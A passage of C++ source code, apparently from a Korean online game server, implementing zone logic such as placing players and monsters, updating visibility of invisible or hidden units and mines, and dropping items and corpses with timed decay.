		pPC->getPlayer()->sendPacket( &myStoreInfo );

		//pPC->getPlayer()->sendPacket( &gcUnionOfferList );

		/*		GCNoticeEvent gcNoticeEvent;
		gcNoticeEvent.setCode( NOTICE_EVENT_CROWN_PRICE );
		gcNoticeEvent.setParameter( g_pVariableManager->getVariable(CROWN_PRICE) );
		pPC->getPlayer()->sendPacket( &gcNoticeEvent );*/
	} 
	else 
	{
		ZoneCoord_t tempX = Random(20, m_Width);
		ZoneCoord_t tempY = Random(20, m_Height);
		addPC(pCreature, tempX, tempY, 0);

		// 맥스카운트 지나도 못 찾은 경우 Assert
		//throw EmptyTileNotExistException("too many pc in this zone.. or too unlucky");
	}


	__END_PROFILE_ZONE("Z_ADD_PC")

	__END_DEBUG
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// detect invisibility등의 효과가 사라진 경우..보이는 놈이 안보이게 될 경우
// pCreature에게 GCDeleteObject를 보내준다. 보고 있던 invisible creature를
// delete한다. 또는 안보인는 넘이 보이게 될 경우등..
//////////////////////////////////////////////////////////////////////////////
void Zone::updateInvisibleScan(Creature* pCreature)
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	// Revealer 이펙트를 가져온다.
//	EffectRevealer* pEffectRevealer = NULL;
//	if ( pCreature->isFlag(Effect::EFFECT_CLASS_REVEALER) )
//	{
//		pEffectRevealer = dynamic_cast<EffectRevealer*>(pCreature->findEffect(Effect::EFFECT_CLASS_REVEALER));
//		Assert( pEffectRevealer != NULL );
//	}

	// ObservingEey 이펙트를 가져온다.
	EffectObservingEye* pEffectObservingEye = NULL;
	if ( pCreature->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
	{
		pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pCreature->findEffect(Effect::EFFECT_CLASS_OBSERVING_EYE));
		//Assert( pEffectObservingEye != NULL );
	}

	EffectGnomesWhisper* pEffectGnomesWhisper = NULL;
	// GnomesWhisper 이펙트를 가져온다.
	if ( pCreature->isFlag(Effect::EFFECT_CLASS_GNOMES_WHISPER) )
	{
		pEffectGnomesWhisper = dynamic_cast<EffectGnomesWhisper*>(pCreature->findEffect(Effect::EFFECT_CLASS_GNOMES_WHISPER));
	}

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			// darkness영역 조사.
			// 사실 pCreature는 당연히 slayer다.(updateInvisibleScan이므로..)
			if (pCreature->isSlayer() || pCreature->isOusters())
			{
				const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
				forward_list<Object*>::const_iterator itr = objectList.begin();

				for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
				{
					if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pPC = dynamic_cast<Creature*>(*itr);
						Assert(pPC != NULL);

						// 자기 자신일 경우 통과
						if ( pCreature == pPC 
							|| pPC->isFlag(Effect::EFFECT_CLASS_GHOST)) continue;

						// 숨어있는 대상에 대해서..
						// SNIPING이나 INVISIBILITY상태일 경우.
						if (pPC->isFlag(Effect::EFFECT_CLASS_INVISIBILITY) && pCreature->getVisionState(ix,iy) >= IN_SIGHT)
						{
							// Detect Invisibility 이펙트가 있거나 뱀파이어면 볼 수 있다
							// ObservingEye 이펙트가 있을 경우 상대방을 볼 수 있는 레벨이라면
							if ( pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) || pCreature->isVampire() 
								|| ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pPC ) ) 
								|| ( pEffectGnomesWhisper != NULL && pEffectGnomesWhisper->canSeeInvisibility() ) 
							)
							{
								if (pPC->isVampire())
								{
									Vampire* pVampire = dynamic_cast<Vampire*>(pPC);
									GCAddVampire gcAddVampire;

									makeGCAddVampire(&gcAddVampire, pVampire);
									pPlayer->sendPacket(&gcAddVampire);
								}
								else if (pPC->isMonster())
								{
									Monster* pMonster= dynamic_cast<Monster*>(pPC);
									//GCAddMonster gcAddMonster;
									//makeGCAddMonster(&gcAddMonster, pMonster);
									//pPlayer->sendPacket(&gcAddMonster);

									// by sigi
									Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pCreature );

									if (pAddMonsterPacket!=NULL)
									{
										pPlayer->sendPacket(pAddMonsterPacket);

										delete pAddMonsterPacket;
									}
								}
							}
							else
							{
								GCDeleteObject gcDO;
								gcDO.setObjectID(pPC->getObjectID());
								pPlayer->sendPacket(&gcDO);
							}
						} 
						else if (pPC->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)) 
						{
							if ( (!pCreature->isVampire() && pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) ) )
//								|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeSniping( pPC ) ) )
							{
								if (pPC->isSlayer())
								{
									Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
									
									GCAddSlayer gcAddSlayer;
									makeGCAddSlayer(&gcAddSlayer, pSlayer);
									pPlayer->sendPacket(&gcAddSlayer);
								}
								else 
								{
									throw Error("뱀파이어가 스나이핑 모드에 있다. 미쳐써~");
								}
							}
							else
							{
								GCDeleteObject gcDO;
								gcDO.setObjectID(pPC->getObjectID());
								pPlayer->sendPacket(&gcDO);
							}
						}
					}
				}
			}// darkness
		}
	}

	__END_CATCH
}

//--------------------------------------------------------------------------------
// update hidden scan
// detect hidden등의 효과가 사라진 경우..보이는 놈이 안보이게 될 경우
// pCreature에게 GCDeleteObject를 보내준다.
// 보고 있던 burrow creature를 delete한다. 또는 안보인는 넘이 보이게 될 경우등..
// ABCD
//--------------------------------------------------------------------------------
void Zone::updateHiddenScan(Creature* pCreature)
	
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	// Revealer 이펙트를 가져온다.
//	EffectRevealer* pEffectRevealer = NULL;
//	if ( pCreature->isFlag(Effect::EFFECT_CLASS_REVEALER) )
//	{
//		pEffectRevealer = dynamic_cast<EffectRevealer*>(pCreature->findEffect(Effect::EFFECT_CLASS_REVEALER));
//		Assert( pEffectRevealer != NULL );
//	}

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			// darkness영역 조사.
			// 사실 pCreature는 당연히 slayer다.(updateHiddenScan이므로..)
			if (pCreature->isSlayer())
			{
				const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();

				for (forward_list<Object*>::const_iterator itr = objectList.begin() ; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
				{

					if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pPC = dynamic_cast<Creature*>(*itr);
						Assert(pPC != NULL);
						
						// 자기 자신일 경우 통과
						if ( pCreature == pPC ) continue;

						// 숨어있는 대상에 대해서..
						if (pPC->isFlag(Effect::EFFECT_CLASS_HIDE) && 
								pCreature->getVisionState(ix,iy) >= IN_SIGHT)
						{
							if ( pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) || pCreature->isVampire()  )
//								|| ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pPC ) ) )
							{
								GCAddBurrowingCreature gcABC;
								gcABC.setObjectID(pPC->getObjectID());
								gcABC.setName(pPC->getName());
								gcABC.setX(ix);
								gcABC.setY(iy);
								pPlayer->sendPacket(&gcABC);
							}
							else
							{
								GCDeleteObject gcDO;
								gcDO.setObjectID(pPC->getObjectID());
								pPlayer->sendPacket(&gcDO);
							}
						}
					}
				}
			}// darkness
		}
	}

	__END_CATCH
}


//////////////////////////////////////////////////////////////////////////////
// Detect 기능이 생기거나 없어질 경우.
// 보는 Creature 의 Creature 추가 삭제 처리
// 아우스터스 용
//////////////////////////////////////////////////////////////////////////////
void Zone::updateDetectScan(Creature* pCreature)
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	EffectGnomesWhisper* pEffectGnomesWhisper = NULL;
	if ( pCreature->isFlag( Effect::EFFECT_CLASS_GNOMES_WHISPER ) )
	{
		pEffectGnomesWhisper = dynamic_cast<EffectGnomesWhisper*>(pCreature->findEffect(Effect::EFFECT_CLASS_GNOMES_WHISPER));
	}

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			if ( pCreature->getVisionState(ix,iy) == OUT_OF_SIGHT ) continue;

			if (pCreature->isOusters())
			{
				const forward_list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
				forward_list<Object*>::const_iterator itr = objectList.begin();

				for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE ; itr++) 
				{
					if ((*itr)->getObjectClass() == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pPC = dynamic_cast<Creature*>(*itr);
						Assert(pPC != NULL);

						// 자기 자신일 경우 통과
						if ( pCreature == pPC 
							|| pPC->isFlag(Effect::EFFECT_CLASS_GHOST)) continue;

						if ( pPC->isSlayer() )
						{
							if ( pPC->isFlag( Effect::EFFECT_CLASS_SNIPING_MODE ) )
							{
								if ( canSee( pCreature, pPC, NULL, pEffectGnomesWhisper ) )
								{
									Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);
									
									GCAddSlayer gcAddSlayer;
									makeGCAddSlayer(&gcAddSlayer, pSlayer);
									pPlayer->sendPacket(&gcAddSlayer);
								}
								else
								{
									GCDeleteObject gcDO;
									gcDO.setObjectID(pPC->getObjectID());
									pPlayer->sendPacket(&gcDO);
								}
							}
						}
						else if ( pPC->isVampire() )
						{
							if ( pPC->isFlag( Effect::EFFECT_CLASS_INVISIBILITY ) )
							{
								if ( canSee( pCreature, pPC, NULL, pEffectGnomesWhisper ) )
								{
									Vampire* pVampire = dynamic_cast<Vampire*>(pPC);
									GCAddVampire gcAddVampire;

									makeGCAddVampire(&gcAddVampire, pVampire);
									pPlayer->sendPacket(&gcAddVampire);
								}
								else
								{
									GCDeleteObject gcDO;
									gcDO.setObjectID(pPC->getObjectID());
									pPlayer->sendPacket(&gcDO);
								}
							}

							if ( pPC->isFlag( Effect::EFFECT_CLASS_HIDE ) )
							{
								if ( canSee( pCreature, pPC, NULL, pEffectGnomesWhisper ) )
								{
									GCAddBurrowingCreature gcABC;
									gcABC.setObjectID(pPC->getObjectID());
									gcABC.setName(pPC->getName());
									gcABC.setX(ix);
									gcABC.setY(iy);
									pPlayer->sendPacket(&gcABC);
								}
								else
								{
									GCDeleteObject gcDO;
									gcDO.setObjectID(pPC->getObjectID());
									pPlayer->sendPacket(&gcDO);
								}
							}
						}
						else if ( pPC->isMonster() )
						{
							if ( pPC->isFlag( Effect::EFFECT_CLASS_INVISIBILITY ) || pPC->isFlag( Effect::EFFECT_CLASS_HIDE ) )
							{
								if ( canSee( pCreature, pPC, NULL, pEffectGnomesWhisper ) )
								{
									Monster* pMonster= dynamic_cast<Monster*>(pPC);

									Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pCreature );

									if (pAddMonsterPacket!=NULL)
									{
										pPlayer->sendPacket(pAddMonsterPacket);

										delete pAddMonsterPacket;
									}
								}
								else
								{
									GCDeleteObject gcDO;
									gcDO.setObjectID(pPC->getObjectID());
									pPlayer->sendPacket(&gcDO);
								}
							}
						}
					}
				}
			}
		}
	}

	__END_CATCH
}

//--------------------------------------------------------------------------------
// update mine scan
// detect mine등의 효과가 사라진 경우..보이는 mine이 안보이게 될 경우
// pCreature에게 GCDeleteObject를 보내준다.
//--------------------------------------------------------------------------------
void Zone::updateMineScan(Creature* pCreature)
{
	__BEGIN_TRY

	Assert(pCreature != NULL && pCreature->isPC());

	Coord_t cx = pCreature->getX();
	Coord_t cy = pCreature->getY();
	Player* pPlayer = pCreature->getPlayer();

	for (ZoneCoord_t ix = max(0, cx - maxViewportWidth - 1), endx = min(m_Width - 1, cx + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, cy - maxViewportUpperHeight - 1), endy = min(m_Height - 1, cy + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			if ( pCreature->getVisionState(ix,iy) == OUT_OF_SIGHT ) continue;

			// 사실 pCreature는 당연히 slayer다.(updateMineScan이므로..)
			if (pCreature->isSlayer())
			{
				Item* pItem = m_pTiles[ix][iy].getItem();
				if (pItem)
				{
					if (pItem->getItemClass() == Item::ITEM_CLASS_MINE && pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
					{
						if (pCreature->isFlag(Effect::EFFECT_CLASS_REVEALER) )
						{
							
							GCAddInstalledMineToZone gcAddMine;
							gcAddMine.setObjectID(pItem->getObjectID());
							gcAddMine.setX(ix);
							gcAddMine.setY(iy);
							gcAddMine.setItemClass(pItem->getItemClass());
							gcAddMine.setItemType(pItem->getItemType());
							gcAddMine.setOptionType(pItem->getOptionTypeList());
							gcAddMine.setDurability(pItem->getDurability());

							pPlayer->sendPacket(&gcAddMine);
						} else {
							GCDeleteObject gcDO;
							gcDO.setObjectID(pItem->getObjectID());
							pPlayer->sendPacket(&gcDO);
						}
					}
				}
			}// darkness
		}
	}

	__END_CATCH
}


//--------------------------------------------------------------------------------
// add Creature
// 크리처가 존에 최초로 들어갈 때, 크리처 주변의 PC들에게 새 크리처의 출현을 알려준다.
//--------------------------------------------------------------------------------
void Zone::addCreature(Creature* pCreature, ZoneCoord_t cx, ZoneCoord_t cy, Dir_t dir)
	
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_ADD_CREATURE")

	TPOINT pt = findSuitablePosition(this, cx, cy, pCreature->getMoveMode());

	// 찾은 경우 체크
	if (pt.x != -1) 
	{
		//--------------------------------------------------------------------------------
		// OID 를 할당받는다.
		//--------------------------------------------------------------------------------
		m_ObjectRegistry.registerObject(pCreature);

		//--------------------------------------------------------------------------------
		// 적절한 타일을 찾았으면, 크리처를 크리처매니저와 타일에 각각 집어넣는다.
		// Monster 일 경우, MonsterManager에 추가하며, NPC 일 경우, NPCManager 에 추가한다.
		//--------------------------------------------------------------------------------
		if (pCreature->isMonster())
		{

//#ifdef __XMAS_EVENT_CODE__
			Monster* pMonster = dynamic_cast<Monster*>(pCreature);

			if ( isDynamicZone() )
			{
				pMonster->setScanEnemy(true);
			}

			m_pMonsterManager->addCreature(pCreature);
			if ( pCreature->getClanType() != CLAN_VAMPIRE_MONSTER )
				cout << pCreature->toString() << " regens at " << pt.x << " , " << pt.y << endl;

			switch ( pMonster->getMonsterType() )
			{
				case 717:
				case 721:
				case 723:
				case 724:
				case 725:
					{
						unordered_map<ObjectID_t, Creature*>::iterator itr = m_pPCManager->getCreatures().begin();
						unordered_map<ObjectID_t, Creature*>::iterator endItr = m_pPCManager->getCreatures().end();

						for ( ; itr != endItr ; ++itr )
						{
							pMonster->addPotentialEnemy( itr->second );
						}
						break;
					}
				default:
					break;
			}

			/*
			switch (pMonster->getMonsterType())
			{
				case 358:
				case 359:
				case 360:
				case 361:
					m_pEventMonsterManager->addCreature(pCreature);
					break;

				default:
					m_pMonsterManager->addCreature(pCreature);
					break;
			}
			*/
//#else
//			m_pMonsterManager->addCreature(pCreature);
/*
#endif
*/

		}
		else if (pCreature->isNPC())
		{
			m_pNPCManager->addCreature(pCreature);
		}

		//cout << "타일에 몬스터 추가하기" << endl;
	   	m_pTiles[pt.x][pt.y].addCreature(pCreature, false);
	
		//--------------------------------------------------------------------------------
		// 크리처의 좌표를 지정한다.
		//--------------------------------------------------------------------------------
		pCreature->setXYDir(pt.x, pt.y, dir);
		pCreature->setZone(this);
		
		//scanPC(pCreature);

		//--------------------------------------------------------------------------------
		// 주변의 PC들에게 알릴 GCAddNPC or GCAddMonster 패킷을 생성한다.
		//--------------------------------------------------------------------------------
		//cout << "주변의 PC들에게 알릴 패킷 만들기" << endl;
		Creature::CreatureClass CClass = pCreature->getCreatureClass();

		if (CClass == Creature::CREATURE_CLASS_NPC)
		{
			NPC* pNPC = dynamic_cast<NPC*>(pCreature);
			GCAddNPC gcAddNPC;
			makeGCAddNPC(&gcAddNPC, pNPC);
			broadcastPacket(pt.x, pt.y, &gcAddNPC);
		}
		else if (CClass == Creature::CREATURE_CLASS_MONSTER)
		{
			//cout << "몬스터용 패킷 만들기" << endl;
			Monster* pMonster = dynamic_cast<Monster*>(pCreature);

			// zone에 처음 들어갈때도 여러가지 상태가 있다.. by sigi
			Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, NULL );

			if (pAddMonsterPacket!=NULL)
			{
				broadcastPacket( cx, cy, pAddMonsterPacket, pMonster );
/*				ZoneCoord_t ix = 0;
				ZoneCoord_t iy = 0;
				ZoneCoord_t endx = 0;
				ZoneCoord_t endy = 0;


				//////////////////////////////////////////////////////////////////////////////
				// 루프 변수 초기화..
				//////////////////////////////////////////////////////////////////////////////
				int Range = 0;
				endx = min(m_Width - 1, cx + maxViewportWidth + 1 + Range);
				endy = min(m_Height - 1, cy + maxViewportLowerHeight  + 1 + Range);

				for (ix =  max(0, cx - maxViewportWidth - 1 - Range); ix <= endx ; ix++) 
				{
					for (iy = max(0, cy - maxViewportUpperHeight - 1 -  Range); iy <= endy ; iy++) 
					{
						// 타일에 크리처가 있는 경우에만
						if (m_pTiles[ix][iy].hasCreature()) 
						{
							const slist<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
							slist<Object*>::const_iterator itr = objectList.begin();

							for (; itr != objectList.end() && (*itr)->getObjectPriority() <= OBJECT_PRIORITY_BURROWING_CREATURE; itr++) 
							{
								Creature* pOtherCreature = dynamic_cast<Creature*>(*itr);
								Assert(pOtherCreature != NULL);

								if (pOtherCreature->isPC()) 
								{
									if ( canSee( pOtherCreature, pMonster ) )
									{
										pOtherCreature->getPlayer()->sendPacket(pAddMonsterPacket);
									}
								} // if

							} // for
						}//if
					}//for
				}//for
*/
				delete pAddMonsterPacket;
			}

			// by sigi. 2002.9.6
			// 포탈을 통해서 나타나는 모습을 보여준다.
			// 플래그를 꺼준다.
			if (pMonster->isFlag(Effect::EFFECT_CLASS_VAMPIRE_PORTAL))
			{
				pMonster->removeFlag(Effect::EFFECT_CLASS_VAMPIRE_PORTAL);
			}
		}
		else
		{
			throw Error("invalid creature type");
		}
	} 
	else 
	{
		throw EmptyTileNotExistException("too many creature in this zone.. or too unlucky");
	}

	__END_PROFILE_ZONE("Z_ADD_CREATURE")

	__END_CATCH
}


//--------------------------------------------------------------------------------
// 특정 위치에 아이템을 떨어뜨린다.
// Zone ::addItem()
// 7x7 영역을 검사해서 빈칸이 존재하면 떨어뜨린다. 문제는 재수없는 경우 빈칸이 
// 존재하지 않을 경우인데.. 이때 예외를 던짐으로써 그 처리를 상위에게 맡기면
// 될 듯...
//--------------------------------------------------------------------------------
TPOINT Zone::addItem(Item* pItem, ZoneCoord_t cx, ZoneCoord_t cy, bool bAllowCreature, Turn_t decayTurn, ObjectID_t DropPetOID)
	
{
	__BEGIN_TRY

	__BEGIN_DEBUG

	TPOINT          pt;

	__BEGIN_PROFILE_ZONE("Z_ADD_ITEM")

	Item::ItemClass IClass = pItem->getItemClass();

	bool bAllowSafeZone = true;

	if ( isRelicItem( IClass ) || pItem->isFlagItem() )
		bAllowSafeZone = false;

	bool bDropForce = false;
	if ( pItem->isFlag( Effect::EFFECT_CLASS_DROP_FORCE ) )
	{
		pItem->removeFlag( Effect::EFFECT_CLASS_DROP_FORCE );
		bDropForce = true;
	}
	pt     = findSuitablePositionForItem(this, cx, cy, bAllowCreature, bAllowSafeZone, bDropForce);
	
	// 놓을 위치를 찾아낸 경우
	if (pt.x != -1) 
	{ 
		m_pTiles[pt.x][pt.y].addItem(pItem);
		addToItemList(pItem);
			   	
		if (IClass == Item::ITEM_CLASS_CORPSE) 
		{
			ItemType_t itemType = pItem->getItemType();

			Turn_t DelayTime = 0;

			bool isShrine = false;
			bool isFlag = false;

			if (itemType == SLAYER_CORPSE)
			{
				SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
				pSlayerCorpse->setXY(pt.x, pt.y);

				GCAddSlayerCorpse gcAddSlayerCorpse;
				makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
				broadcastPacket(pt.x, pt.y, &gcAddSlayerCorpse);

				// 마스터 레어에서는 시체가 빨리 사라진다.
				if (isMasterLair()) DelayTime = DELAY_MASTER_LAIR_DECAY_CORPSE;
				 				else DelayTime = 6000;
			}
			else if (itemType == VAMPIRE_CORPSE)
			{
				VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
				pVampireCorpse->setXY(pt.x, pt.y);

				GCAddVampireCorpse gcAddVampireCorpse;
				makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
				broadcastPacket(pt.x, pt.y, &gcAddVampireCorpse);

				// 마스터 레어에서는 시체가 빨리 사라진다.
				if (isMasterLair()) DelayTime = DELAY_MASTER_LAIR_DECAY_CORPSE;
				 				else DelayTime = 6000;
			}
			else if (itemType == OUSTERS_CORPSE)
			{
				OustersCorpse* pOustersCorpse = dynamic_cast<OustersCorpse*>(pItem);
				pOustersCorpse->setXY(pt.x, pt.y);

				GCAddOustersCorpse gcAddOustersCorpse;
				makeGCAddOustersCorpse(&gcAddOustersCorpse, pOustersCorpse);
				broadcastPacket(pt.x, pt.y, &gcAddOustersCorpse);

				// 마스터 레어에서는 시체가 빨리 사라진다.
				if (isMasterLair()) DelayTime = DELAY_MASTER_LAIR_DECAY_CORPSE;
				 				else DelayTime = 6000;
			}
			else if (itemType == NPC_CORPSE)
			{
				Assert(false);
			}
			else if (itemType == MONSTER_CORPSE)
			{
				MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
				GCAddMonsterCorpse gcAddMonsterCorpse;
				makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, pt.x, pt.y);
				broadcastPacket(pt.x, pt.y, &gcAddMonsterCorpse);

				isFlag = g_pFlagManager->isFlagPole( pMonsterCorpse );

				// 마스터 레어에서는 시체가 빨리 사라진다.
				if (isMasterLair()) 
				{
					MonsterType_t mt = pMonsterCorpse->getMonsterType();
					const MonsterInfo* pMonsterInfo = g_pMonsterInfoManager->getMonsterInfo( mt );
					Assert(pMonsterInfo!=NULL);

					// 마스터 시체인 경우는 더 빨리 사라진다.
					if (pMonsterInfo->isMaster())
					{
						// 아이템이 없어서 더 빨리 사라지기 때문이다. * 10
						DelayTime = DELAY_MASTER_LAIR_DECAY_MASTER_CORPSE * 10;
					}
					else
					{
						DelayTime = DELAY_MASTER_LAIR_DECAY_CORPSE;
					}
				}
				else DelayTime = 600;

				sendRelicEffect( pMonsterCorpse, this, pt.x, pt.y );

				// 이건 임시다. -_-;
				// 원래 item에는 zone좌표가 들어가지 않는데
				// 특별히 성물보관대에는 필요하기 때문에..
				pMonsterCorpse->setX( pt.x );
				pMonsterCorpse->setY( pt.y );
				pMonsterCorpse->setZone( this );

				isShrine = pMonsterCorpse->isShrine() && !g_pFlagManager->isFlagPole( pMonsterCorpse );
				
				// Shrine인 경우 미니맵에 보여준다.
				if (isShrine)
				{
					NPCInfo* pNPCInfo = new NPCInfo();
					pNPCInfo->setName( pMonsterCorpse->getName() );
					pNPCInfo->setNPCID( pMonsterCorpse->getMonsterType() );
					pNPCInfo->setX( pt.x );
					pNPCInfo->setY( pt.y );

					addNPCInfo( pNPCInfo );
				}
			}
			else
			{
				Assert(false);
			}

			// 아이템이 들어가있지 않은 시체라면 딜레이 시간을 줄인다.
			Corpse* pCorpse = dynamic_cast<Corpse*>(pItem);
			if (pCorpse->getTreasureCount() == 0)
			{
				DelayTime = DelayTime/10;
			}
			// Relic인 경우에는 시간의 지연에 따라 아이템이 사라지지 않는다.
			if (!isShrine && !isFlag
				&& !pCorpse->isFlag(Effect::EFFECT_CLASS_SLAYER_RELIC_TABLE)
			    && !pCorpse->isFlag(Effect::EFFECT_CLASS_VAMPIRE_RELIC_TABLE)
			    && !pCorpse->isFlag(Effect::EFFECT_CLASS_SHRINE_GUARD)
			    && !pCorpse->isFlag(Effect::EFFECT_CLASS_SHRINE_HOLY) 
				&& pCorpse->getTreasureCount() < 200 )
			{
				// 강제로 지정한 delay
				if (decayTurn!=0) DelayTime = decayTurn;

				// 바닥에 떨어지는 아이템은 일정 시간이 지나면 사라지게 된다.
				EffectDecayCorpse* pEffectDecayCorpse = new EffectDecayCorpse(this, pt.x, pt.y, (Corpse*)pItem, DelayTime);
//				pEffectDecayCorpse->setNextTime(999999);
				m_ObjectRegistry.registerObject(pEffectDecayCorpse);
				addEffect(pEffectDecayCorpse);
			}
			else
			{
				// 깃대인 경우엔 block되면 안된다.
				if ( !isFlag )
				{
					// 성물 보관대는 아이템(시체)이지만
					// Block이 되어야 한다.
					Tile& rTile = getTile(pt.x, pt.y);
					
					rTile.setBlocked( Creature::MOVE_MODE_WALKING );
					rTile.setBlocked( Creature::MOVE_MODE_BURROWING );

					// 성물 보관대의 정보를 저장한다.
					m_RelicTableOID = pCorpse->getObjectID();
					m_RelicTableX = pt.x;
					m_RelicTableY = pt.y;
					
					//cout << "Relic인 경우에는 시체가 사라지지 않습니다" << endl;
				}
			}
		} 
		else
		{
			GCDropItemToZone gcDropItemToZone;
			makeGCDropItemToZone(&gcDropItemToZone, pItem, pt.x, pt.y);
			gcDropItemToZone.setDropPetOID( DropPetOID );

			broadcastPacket(pt.x, pt.y, &gcDropItemToZone);

			// 모터사이클은 시간이 지나도 사라지지 않는다.
			if (IClass == Item::ITEM_CLASS_MOTORCYCLE)
			{
				// transport인 경우를 대비해서 체크해제해야한다.
				MotorcycleBox* pMotorcycleBox = g_pParkingCenter->getMotorcycleBox( pItem->getItemID() );

				if (pMotorcycleBox!=NULL)
				{
					Motorcycle* pMotorcycle = pMotorcycleBox->getMotorcycle();
					Assert(pMotorcycle!=NULL);

					// 아이템 저장 최적화. by sigi. 2002.5.15
					char pField[80];
					sprintf(pField, "OwnerID='', Storage=%d, StorageID=%u, X=%d, Y=%d",
									STORAGE_ZONE, getZoneID(), (int)pt.x, (int)pt.y);

					pMotorcycle->tinysave( pField );

					pMotorcycleBox->setZone( this );
					pMotorcycleBox->setX( pt.x );
					pMotorcycleBox->setY( pt.y );

					pMotorcycleBox->setTransport( false );
				}
			}
			else if (isRelicItem( IClass ))
			{
				// relic은 사라지지 않는다.
				addEffectRelicPosition( pItem, getZoneID(), pt );
				char pField[80];
				sprintf(pField, "OwnerID='', Storage=%d, StorageID=%u, X=%d, Y=%d", STORAGE_ZONE, getZoneID(), pt.x, pt.y);
				pItem->tinysave(pField);
			}
			else
			{
				// 2002.10.30 장홍창
				// 아이템 삭제 시간을 현행 10분에서 3분으로 줄인다.
				// Turn_t DelayTime = 6000;
				Turn_t DelayTime = 1800;

				// 마스터 레어에서는 아이템이 빨리 사라진다.
				if (isMasterLair())
				{
					DelayTime = DELAY_MASTER_LAIR_DECAY_ITEM;
				}

				if ( !pItem->isFlagItem() && IClass != Item::ITEM_CLASS_SWEEPER )
				{
					// 강제로 지정한 delay
					if (decayTurn!=0) DelayTime = decayTurn;

					// 바닥에 떨어지는 아이템은 일정 시간이 지나면 사라지게 된다.
					EffectDecayItem* pEffectDecayItem = new EffectDecayItem(this, pt.x, pt.y, (Item*)pItem, DelayTime);
					pEffectDecayItem->setNextTime(999999);
					m_ObjectRegistry.registerObject(pEffectDecayItem);
					addEffect(pEffectDecayItem);
				}
				else
				{
					char pField[80];
					sprintf(pField, "OwnerID='', Storage=%d, StorageID=%u, X=%d, Y=%d", STORAGE_ZONE, getZoneID(), pt.x, pt.y);
					pItem->tinysave(pField);
				}
			}
		}

		return pt;
	} 
	else 
	{
		TPOINT pt_error;
		pt_error.x = -1;
		pt_error.y = -1;

		return pt_error;
	}

	__END_PROFILE_ZONE("Z_ADD_ITEM")
	return pt;

	__END_DEBUG
	__END_CATCH
}


//--------------------------------------------------------------------------------
// get Item
//--------------------------------------------------------------------------------
Item*
Zone::getItem(ObjectID_t id) const
	
{
    unordered_map<ObjectID_t, Item*>::const_iterator iItem = m_Items.find(id);

	if (iItem != m_Items.end())
	{
		return iItem->second;
	}

	return NULL;
}


//--------------------------------------------------------------------------------
//--------------------------------------------------------------------------------
void Zone::addEffect(Effect* pEffect)
	
{
	__BEGIN_TRY

	Assert(pEffect != NULL);

	m_pEffectManager->addEffect(pEffect);

	__END_CATCH
}

void Zone::deleteEffect(ObjectID_t id) 
	
{
	__BEGIN_TRY

	m_pEffectManager->deleteEffect(id);

	__END_CATCH
}

Effect* Zone::findEffect(Effect::EffectClass eid) 
	
{
